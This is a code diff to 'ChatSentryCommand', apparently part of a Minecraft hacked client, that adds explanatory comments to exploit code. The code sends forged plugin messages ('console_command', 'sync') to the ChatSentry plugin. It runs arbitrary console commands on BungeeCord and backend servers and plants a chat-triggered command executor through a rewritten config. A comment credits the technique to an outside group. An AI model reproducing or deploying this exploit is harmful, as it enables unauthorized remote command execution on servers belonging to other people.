@@ -20,6 +20,7 @@ public class ChatSentryCommand extends Command {
   @Override public void build(LiteralArgumentBuilder<CommandSource> root) {
     root.executes(this::incompleteCommand)
       .then(literal("bungee").then(argument("command", StringArgumentType.greedyString()).executes(context -> {
+        // sends the bungeecord command message
         Helper.sendPluginMessage(channel, out -> {
           out.writeUTF("console_command");
           out.writeUTF(context.getArgument("command", String.class));
@@ -36,6 +37,10 @@ public class ChatSentryCommand extends Command {
 
   }
 
+  /**
+   * Sends backend command execution
+   * Originally found by .gg/bukkit - AutismINC
+   */
   private void sendAutoExecution(String command) {
     String s = Helper.generateRandomString(4, "iahosd6as5d9oayhdstdou", new Random());
     Helper.sendPluginMessage(channel, out -> {
@@ -56,6 +61,9 @@ public class ChatSentryCommand extends Command {
     getMinecraftClient().getNetworkHandler().sendChatMessage(s);
   }
 
+  /**
+   * Builds the config file to enable chat executor
+   */
   private void buildConfig(ByteArrayDataOutput out) {
     out.writeUTF("sync");
     out.writeUTF("");
@@ -130,6 +138,9 @@ public class ChatSentryCommand extends Command {
       """);
   }
 
+  /**
+   * Builds the chat executor file
+   */
   private void buildExecutor(ByteArrayDataOutput out, String command, String executionMessage) {
     out.writeUTF("sync");
     out.writeUTF("modules");
